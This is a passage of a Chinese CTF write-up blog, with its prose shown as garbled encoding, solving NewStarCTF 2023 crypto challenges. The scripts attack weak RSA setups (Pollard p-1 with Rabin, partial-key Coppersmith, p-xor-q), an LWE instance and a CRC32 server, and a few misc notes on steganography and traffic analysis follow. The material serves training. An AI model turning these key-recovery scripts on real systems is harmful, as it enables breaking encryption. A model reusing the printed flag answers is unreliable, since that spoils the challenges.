<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime,bytes_to_long, sieve_base</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"> </span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uniPrime</span>(<span class="params">bits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= choice(sieve_base)</span><br><span class="line">        <span class="keyword">if</span> isPrime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">p=uniPrime(<span class="number">512</span>)</span><br><span class="line">q=uniPrime(<span class="number">512</span>)</span><br><span class="line">n=p*q</span><br><span class="line">e= <span class="number">196608</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"> </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"> </span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">n= 3326716005321175474866311915397401254111950808705576293932345690533263108414883877530294339294274914837424580618375346509555627578734883357652996005817766370804842161603027636393776079113035745495508839749006773483720698066943577445977551268093247748313691392265332970992500440422951173889419377779135952537088733</span></span><br><span class="line"><span class="string">c= 2709336316075650177079376244796188132561250459751152184677022745551914544884517324887652368450635995644019212878543745475885906864265559139379903049221765159852922264140740839538366147411533242116915892792672736321879694956051586399594206293685750573633107354109784921229088063124404073840557026747056910514218246</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>åˆ†æå¯ä»¥çœ‹åˆ°ï¼Œç”Ÿæˆpqçš„å‡½æ•°çš„åŸç†æ˜¯å°ç´ æ•°ç´¯ä¹˜ï¼Œåˆ™<code>p-1</code>æ˜¯å…‰æ»‘æ•°ï¼Œå¯ä»¥è€ƒè™‘ç”¨<code>Pollard&#39;s p-1</code>ç®—æ³•åˆ†è§£nï¼Œç„¶å$e=2^{16}*3$ï¼ŒRabinå¯†ç ï¼Œæœ€åå¼€ä¸‰æ¬¡æ–¹æ ¹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">n = <span class="number">3326716005321175474866311915397401254111950808705576293932345690533263108414883877530294339294274914837424580618375346509555627578734883357652996005817766370804842161603027636393776079113035745495508839749006773483720698066943577445977551268093247748313691392265332970992500440422951173889419377779135952537088733</span></span><br><span class="line">c = <span class="number">2709336316075650177079376244796188132561250459751152184677022745551914544884517324887652368450635995644019212878543745475885906864265559139379903049221765159852922264140740839538366147411533242116915892792672736321879694956051586399594206293685750573633107354109784921229088063124404073840557026747056910514218246</span></span><br><span class="line">N = n</span><br><span class="line">a = <span class="number">2</span></span><br><span class="line">n = <span class="number">2</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    a = <span class="built_in">pow</span>(a, n, N)</span><br><span class="line">    res = GCD(a-<span class="number">1</span>, N)</span><br><span class="line">    <span class="keyword">if</span> res != <span class="number">1</span> <span class="keyword">and</span> res != N:</span><br><span class="line">        q = N // res</span><br><span class="line">        p = res</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">x0 = inverse(p, q)</span><br><span class="line">x1 = inverse(q, p)</span><br><span class="line">cs = [c]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    ps = []</span><br><span class="line">    <span class="keyword">for</span> c2 <span class="keyword">in</span> cs:</span><br><span class="line">        r = <span class="built_in">pow</span>(c2, (p + <span class="number">1</span>) // <span class="number">4</span>, p)</span><br><span class="line">        s = <span class="built_in">pow</span>(c2, (q + <span class="number">1</span>) // <span class="number">4</span>, q)</span><br><span class="line">        x = (r * x1 * q + s * x0 * p) % n</span><br><span class="line">        y = (r * x1 * q - s * x0 * p) % n</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(x)</span><br><span class="line">        <span class="keyword">if</span> n - x <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(n - x)</span><br><span class="line">        <span class="keyword">if</span> y <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(y)</span><br><span class="line">        <span class="keyword">if</span> n - y <span class="keyword">not</span> <span class="keyword">in</span> ps:</span><br><span class="line">            ps.append(n - y)</span><br><span class="line">    cs = ps</span><br><span class="line"><span class="keyword">for</span> m <span class="keyword">in</span> ps:</span><br><span class="line">    mm = gmpy2.iroot(m, <span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span> mm[<span class="number">1</span>]:</span><br><span class="line">        flag = long_to_bytes(mm[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<h3 id="error"><a href="#error" class="headerlink" title="error"></a>error</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">data = [<span class="built_in">ord</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> flag]</span><br><span class="line"></span><br><span class="line">mod = <span class="number">0x42</span></span><br><span class="line">n = <span class="number">200</span></span><br><span class="line">p = <span class="number">5</span></span><br><span class="line">q = <span class="number">2</span>**<span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">E</span>():</span><br><span class="line">  <span class="keyword">return</span> vector(ZZ, [<span class="number">1</span> - random.randint(<span class="number">0</span>,p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creatematrix</span>():</span><br><span class="line">  <span class="keyword">return</span> matrix(ZZ, [[q//<span class="number">2</span> - random.randint(<span class="number">0</span>,q) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(mod)])</span><br><span class="line"></span><br><span class="line">A, B, C= creatematrix(), creatematrix(), creatematrix()</span><br><span class="line">x = vector(ZZ, data[<span class="number">0</span>:mod])</span><br><span class="line">y = vector(ZZ, data[mod:<span class="number">2</span>*mod])</span><br><span class="line">z = vector(ZZ, data[<span class="number">2</span>*mod:<span class="number">3</span>*mod])</span><br><span class="line">e = E()</span><br><span class="line">b = x*B+y*A+z*C + e</span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line">res += <span class="string">&quot;A=&quot;</span> + <span class="built_in">str</span>(A) +<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">res += <span class="string">&quot;B=&quot;</span> + <span class="built_in">str</span>(B) +<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">res += <span class="string">&quot;C=&quot;</span> + <span class="built_in">str</span>(C) +<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">res += <span class="string">&quot;b=&quot;</span> + <span class="built_in">str</span>(b) +<span class="string">&#x27;\n&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;enc.out&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  f.write(res)</span><br></pre></td></tr></table></figure>
<p><code>å®¹é”™å­¦ä¹ é—®é¢˜(Learning with Errorsï¼Œ LWE)</code><br>ä¼šä¸äº†ä¸€ç‚¹ï¼Œçœ‹ä¸€ä¸‹å®˜æ–¹</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">è€ƒç‚¹ lwe</span></span><br><span class="line"><span class="string">FLAGï¼šflag&#123;try_lear1n_wi0h_t1e_error&#125;</span></span><br><span class="line"><span class="string">è§£é¢˜æ­¥éª¤</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">s2n=<span class="keyword">lambda</span> x: [<span class="built_in">int</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> re.findall(<span class="string">r&quot;\-?\d+\.?\d*&quot;</span>,x)]</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&quot;./enc.out&quot;</span>,<span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">m = <span class="number">66</span></span><br><span class="line">n = <span class="number">200</span></span><br><span class="line">p = <span class="number">5</span></span><br><span class="line">q = <span class="number">2</span>^<span class="number">20</span></span><br><span class="line">B = [s2n(f[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">A = [s2n(f[i+<span class="number">66</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line">C = [s2n(f[i+<span class="number">132</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m)]</span><br><span class="line"><span class="comment"># print(A)</span></span><br><span class="line"><span class="comment"># print(B)</span></span><br><span class="line"><span class="comment"># print(C)</span></span><br><span class="line"></span><br><span class="line">b= <span class="built_in">list</span>(matrix(ZZ,s2n(f[-<span class="number">1</span>])))</span><br><span class="line">m=A+B+C+b</span><br><span class="line">M = matrix(ZZ,m)</span><br><span class="line">L = M.LLL()</span><br><span class="line"><span class="built_in">print</span>(L[<span class="number">0</span>])</span><br><span class="line">res=M.solve_left(L[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res[:-<span class="number">1</span>]:</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(<span class="built_in">abs</span>(i)),end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>è¿˜æœ‰ä¸ªå‚è€ƒ<br><code>æ ¼åŸºè§„çº¦ + çŸ©é˜µæ±‚è§£</code><br><a target="_blank" rel="noopener" href="https://dexterjie.github.io/2023/11/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/NewStarCTF2023/#error">https://dexterjie.github.io/2023/11/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/NewStarCTF2023/#error</a></p>
<h2 id="week5-1"><a href="#week5-1" class="headerlink" title="week5"></a>week5</h2><h3 id="last-signin"><a href="#last-signin" class="headerlink" title="last_signin"></a>last_signin</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">flag = <span class="string">b&#x27;?&#x27;</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p, q = getPrime(<span class="number">1024</span>), getPrime(<span class="number">1024</span>)</span><br><span class="line">N = p * q</span><br><span class="line">gift = p&amp;(<span class="number">2</span>**<span class="number">923</span>-<span class="number">2</span>**<span class="number">101</span>)</span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;N = &quot;</span>,N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;gift = &quot;</span>,gift)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c = &quot;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">N =  12055968471523053394851394038007091122809367392467691213651520944038861796011063965460456285088011754895260428814358599592032865236006733879843493164411907032292051539754520574395252298997379020268868972160297893871261713263196092380416876697472160104980015554834798949155917292189278888914003846758687215559958506116359394743135211950575060201887025032694825084104792059271584351889134811543088404952977137809673880602946974798597506721906751835019855063462460686036567578835477249909061675845157443679947730585880392110482301750827802213877643649659069945187353987713717145709188790427572582689339643628659515017749</span></span><br><span class="line"><span class="string">p0 =  70561167908564543355630347620333350122607189772353278860674786406663564556557177660954135010748189302104288155939269204559421198595262277064601483770331017282701354382190472661583444774920297367889959312517009682740631673940840597651219956142053575328811350770919852725338374144</span></span><br><span class="line"><span class="string">c =  2475592349689790551418951263467994503430959303317734266333382586608208775837696436139830443942890900333873206031844146782184712381952753718848109663188245101226538043101790881285270927795075893680615586053680077455901334861085349972222680322067952811365366282026756737185263105621695146050695385626656638309577087933457566501579308954739543321367741463532413790712419879733217017821099916866490928476372772542254929459218259301608413811969763001504245717637231198848196348656878611788843380115493744125520080930068318479606464623896240289381601711908759450672519228864487153103141218567551083147171385920693325876018</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>gift = p&amp;(2**923-2**101)</code>ï¼Œpçš„æ¯”ç‰¹é•¿åº¦æ˜¯å¤§äº923çš„ï¼Œä¼šé€ æˆpçš„ä¸­é—´ä½æ³„éœ²<br>å‚è€ƒ<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/193939#h3-28">https://www.anquanke.com/post/id/193939#h3-28</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">N =  </span><br><span class="line">p0 =  </span><br><span class="line">c =  </span><br><span class="line"></span><br><span class="line">def bivariate(pol, XX, YY, kk=4):</span><br><span class="line">    N = pol.parent().characteristic()</span><br><span class="line"></span><br><span class="line">    f = pol.change_ring(ZZ)</span><br><span class="line">    PR, (x, y) = f.parent().objgens()</span><br><span class="line"></span><br><span class="line">    idx = [(k - i, i) for k in range(kk + 1) for i in range(k + 1)]</span><br><span class="line">    monomials = list(map(lambda t: PR(x ** t[0] * y ** t[1]), idx))</span><br><span class="line">    # collect the shift-polynomials</span><br><span class="line">    g = []</span><br><span class="line">    for h, i in idx:</span><br><span class="line">        if h == 0:</span><br><span class="line">            g.append(y ** h * x ** i * N)</span><br><span class="line">        else:</span><br><span class="line">            g.append(y ** (h - 1) * x ** i * f)</span><br><span class="line"></span><br><span class="line">    # construct lattice basis</span><br><span class="line">    M = Matrix(ZZ, len(g))</span><br><span class="line">    for row in range(M.nrows()):</span><br><span class="line">        for col in range(M.ncols()):</span><br><span class="line">            h, i = idx[col]</span><br><span class="line">            M[row, col] = g[row][h, i] * XX ** h * YY ** i</span><br><span class="line"></span><br><span class="line">    # LLL</span><br><span class="line">    B = M.LLL()</span><br><span class="line"></span><br><span class="line">    PX = PolynomialRing(ZZ, &#x27;xs&#x27;)</span><br><span class="line">    xs = PX.gen()</span><br><span class="line">    PY = PolynomialRing(ZZ, &#x27;ys&#x27;)</span><br><span class="line">    ys = PY.gen()</span><br><span class="line"></span><br><span class="line">    # Transform LLL-reduced vectors to polynomials</span><br><span class="line">    H = [(i, PR(0)) for i in range(B.nrows())]</span><br><span class="line">    H = dict(H)</span><br><span class="line">    for i in range(B.nrows()):</span><br><span class="line">        for j in range(B.ncols()):</span><br><span class="line">            H[i] += PR((monomials[j] * B[i, j]) / monomials[j](XX, YY))</span><br><span class="line"></span><br><span class="line">    # Find the root</span><br><span class="line">    poly1 = H[0].resultant(H[1], y).subs(x=xs)</span><br><span class="line">    poly2 = H[0].resultant(H[2], y).subs(x=xs)</span><br><span class="line">    poly = gcd(poly1, poly2)</span><br><span class="line">    x_root = poly.roots()[0][0]</span><br><span class="line"></span><br><span class="line">    poly1 = H[0].resultant(H[1], x).subs(y=ys)</span><br><span class="line">    poly2 = H[0].resultant(H[2], x).subs(y=ys)</span><br><span class="line">    poly = gcd(poly1, poly2)</span><br><span class="line">    y_root = poly.roots()[0][0]</span><br><span class="line"></span><br><span class="line">    return x_root, y_root</span><br><span class="line"></span><br><span class="line">PR = PolynomialRing(Zmod(N), names=&#x27;x,y&#x27;)</span><br><span class="line">x, y = PR.gens()</span><br><span class="line">pol = 2 ** 923 * x + y + p0</span><br><span class="line"></span><br><span class="line">x, y = bivariate(pol, 2 ** 101, 2 ** 101)</span><br><span class="line">p = 2 ** 923 * x + y + p0</span><br><span class="line">q = N // p</span><br><span class="line">e=65537</span><br><span class="line">d = inverse(e, (p - 1)*(q - 1))</span><br><span class="line">m = int(pow(c, d, N))</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
<p>æˆ‘ä¹‹å‰åœ¨å“ªå¿˜äº†(å±±æ²³ï¼Ÿ)ï¼Œè¿˜é‡åˆ°è¿‡<code>p xor q</code>çš„é¢˜ç›®ï¼Œè¿™é‡Œè´´ä¸€ä¸ªè„šæœ¬</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_cong</span>(<span class="params">k, p, q, n, xored=<span class="literal">None</span></span>):</span><br><span class="line">    kmask = (<span class="number">1</span> &lt;&lt; k) - <span class="number">1</span></span><br><span class="line">    p &amp;= kmask</span><br><span class="line">    q &amp;= kmask</span><br><span class="line">    n &amp;= kmask</span><br><span class="line">    pqm = (p*q) &amp; kmask</span><br><span class="line">    <span class="keyword">return</span> pqm == n <span class="keyword">and</span> (xored <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">or</span> (p^q) == (xored &amp; kmask))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extend</span>(<span class="params">k, a</span>):</span><br><span class="line">    kbit = <span class="number">1</span> &lt;&lt; (k-<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">assert</span> a &lt; kbit</span><br><span class="line">    <span class="keyword">yield</span> a</span><br><span class="line">    <span class="keyword">yield</span> a | kbit</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">factor</span>(<span class="params">n, p_xor_q</span>):</span><br><span class="line">    tracked = <span class="built_in">set</span>([(p, q) <span class="keyword">for</span> p <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>] <span class="keyword">for</span> q <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">1</span>]</span><br><span class="line">                   <span class="keyword">if</span> check_cong(<span class="number">1</span>, p, q, n, p_xor_q)])</span><br><span class="line"></span><br><span class="line">    PRIME_BITS = <span class="built_in">int</span>(math.ceil(math.log(n, <span class="number">2</span>)/<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    maxtracked = <span class="built_in">len</span>(tracked)</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, PRIME_BITS+<span class="number">1</span>):</span><br><span class="line">        newset = <span class="built_in">set</span>()</span><br><span class="line">        <span class="keyword">for</span> tp, tq <span class="keyword">in</span> tracked:</span><br><span class="line">            <span class="keyword">for</span> newp_ <span class="keyword">in</span> extend(k, tp):</span><br><span class="line">                <span class="keyword">for</span> newq_ <span class="keyword">in</span> extend(k, tq):</span><br><span class="line">                    <span class="comment"># Remove symmetry</span></span><br><span class="line">                    newp, newq = <span class="built_in">sorted</span>([newp_, newq_])</span><br><span class="line">                    <span class="keyword">if</span> check_cong(k, newp, newq, n, p_xor_q):</span><br><span class="line">                        newset.add((newp, newq))</span><br><span class="line"></span><br><span class="line">        tracked = newset</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(tracked) &gt; maxtracked:</span><br><span class="line">            maxtracked = <span class="built_in">len</span>(tracked)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Tracked set size: &#123;&#125; (max=&#123;&#125;)&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(tracked), maxtracked))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># go through the tracked set and pick the correct (p, q)</span></span><br><span class="line">    <span class="keyword">for</span> p, q <span class="keyword">in</span> tracked:</span><br><span class="line">        <span class="keyword">if</span> p != <span class="number">1</span> <span class="keyword">and</span> p*q == n:</span><br><span class="line">            <span class="keyword">return</span> p, q</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> <span class="literal">False</span>, <span class="string">&#x27;factors were not in tracked set. Is your p^q correct?&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage: xor_factor.py n p_xor_q&#x27;</span>, file=sys.stderr)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;(give both numbers in decimal)&#x27;</span>, file=sys.stderr)</span><br><span class="line"></span><br><span class="line">    n = </span><br><span class="line">    p_xor_q = </span><br><span class="line"></span><br><span class="line">    p, q = factor(n, p_xor_q)</span><br><span class="line">    <span class="built_in">print</span>(p)</span><br><span class="line">    <span class="built_in">print</span>(q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h3 id="School-of-CRC32"><a href="#School-of-CRC32" class="headerlink" title="School of CRC32"></a>School of CRC32</h3><p>é¢˜ç›®æºç </p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"></span><br><span class="line">ROUND = <span class="number">100</span></span><br><span class="line"></span><br><span class="line">LENGTH = <span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Extreme hard CRC32 challenge&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ARE YOU READY&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(ROUND):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;ROUND&#x27;</span>, i, <span class="string">&#x27;!&#x27;</span>*<span class="built_in">int</span>(i/<span class="number">75</span> + <span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    target = secrets.randbits(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Here is my CRC32 value: &#x27;</span>, <span class="built_in">hex</span>(target))</span><br><span class="line"></span><br><span class="line">    dat = <span class="built_in">input</span>(<span class="string">&#x27;Show me some data &gt; &#x27;</span>)</span><br><span class="line">    raw = <span class="built_in">bytes</span>.fromhex(dat)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> zlib.crc32(raw) == target <span class="keyword">and</span> <span class="built_in">len</span>(raw) == LENGTH:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;GREAT&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;OH NO&quot;</span>)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Congratulation! Here is your flag&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>CRC32ç¢°æ’ï¼Œæ ¹æ®CRC32çš„å€¼æ±‚åŸå­—ç¬¦ä¸²<br>å‚è€ƒ<a target="_blank" rel="noopener" href="https://dexterjie.github.io/2023/11/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/NewStarCTF2023/#School-of-CRC32">https://dexterjie.github.io/2023/11/04/%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0/NewStarCTF2023/#School-of-CRC32</a></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> crcsolver</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>, <span class="number">28000</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    data = sh.recvuntil(<span class="string">b&quot;Here is my CRC32 value:&quot;</span>)</span><br><span class="line">    c = <span class="built_in">eval</span>(sh.recvline().decode())</span><br><span class="line">    m = crcsolver.solve(<span class="string">b&#x27;_&#x27;</span>*<span class="number">20</span>, <span class="built_in">range</span>(<span class="number">8</span>*<span class="number">20</span>), c, zlib.crc32)</span><br><span class="line">    message = <span class="built_in">hex</span>(bytes_to_long(m))[<span class="number">2</span>:].zfill(<span class="number">40</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">b&quot;Show me some data &gt;&quot;</span>, message)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¼ ç»™æœåŠ¡å™¨çš„æ•°æ®éœ€è¦æ˜¯16è¿›åˆ¶å½¢å¼ï¼Œè€Œä¸”ï¼Œå¾—å¡«å……æ»¡40ä½ï¼Œå¦åˆ™æŠ¥é”™<br>å…³é”®ä»£ç <code>m = crcsolver.solve(b&#39;_&#39;*20, range(8*20), c, zlib.crc32)</code><br>éœ€è¦ä¸‹è½½<code>crcsolver</code>è¿™ä¸ªåº“</p>
<h3 id="PseudoHell-EASY"><a href="#PseudoHell-EASY" class="headerlink" title="PseudoHell_EASY"></a>PseudoHell_EASY</h3><p>æ¶¦æ¶¦æ¶¦ï¼Œå¤ä¸äº†ä¸€ç‚¹</p>
<h3 id="PseudoHell-HARD"><a href="#PseudoHell-HARD" class="headerlink" title="PseudoHell_HARD"></a>PseudoHell_HARD</h3><p>æ¶¦æ¶¦æ¶¦</p>
<h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="week1-2"><a href="#week1-2" class="headerlink" title="week1"></a>week1</h2><h3 id="CyberChefâ€™s-Secret"><a href="#CyberChefâ€™s-Secret" class="headerlink" title="CyberChefâ€™s Secret"></a>CyberChefâ€™s Secret</h3><p>å¨å­ç§’äº†ï¼Œç­¾åˆ°é¢˜ï¼Œ<code>base32-&gt;base58-&gt;base64</code></p>
<h3 id="æœºå¯†å›¾ç‰‡"><a href="#æœºå¯†å›¾ç‰‡" class="headerlink" title="æœºå¯†å›¾ç‰‡"></a>æœºå¯†å›¾ç‰‡</h3><p>ç›´æ¥æ‰«äºŒç»´ç æ²¡æœ‰å¯ç”¨ä¿¡æ¯ï¼Œ010ä¹Ÿæ²¡æœ‰æ‰¾åˆ°ï¼Œè€ƒè™‘<code>lsbéšå†™</code>ï¼Œå¯ä»¥ç”¨å·¥å…·<code>Stegsolve</code>ï¼Œä¹Ÿå¯ä»¥<code>zsteg -a secret.png</code>(è¿™ä¸ªç§’äº†)</p>
<h3 id="æµé‡ï¼é²¨é±¼ï¼"><a href="#æµé‡ï¼é²¨é±¼ï¼" class="headerlink" title="æµé‡ï¼é²¨é±¼ï¼"></a>æµé‡ï¼é²¨é±¼ï¼</h3><p>ç›´æ¥æœflagæ‰¾ä¸åˆ°ï¼Œ<code>æ–‡ä»¶-&gt;å¯¼å‡ºå¯¹è±¡-&gt;HTTPæµ</code><br>å‘ç°å¯ç–‘æ–‡ä»¶<br><img src="https://picx.zhimg.com/80/v2-56f60bf2f6797789b7ca529e600922e7_1440w.png" alt=""><br>ä¸€å¼€å§‹å‘ç°æŒºå¤š404è¯·æ±‚çš„ï¼Œæƒ³è¿‡æ»¤ä¸€ä¸‹ï¼Œ<code>http &amp;&amp; http.response.code == 200</code><br>å‘ç°å¥½åƒæ‰¾ä¸åˆ°ä¸œè¥¿ï¼Ÿç„¶åå°±è·‘å»å¯¼å‡ºå¯¹è±¡äº†</p>
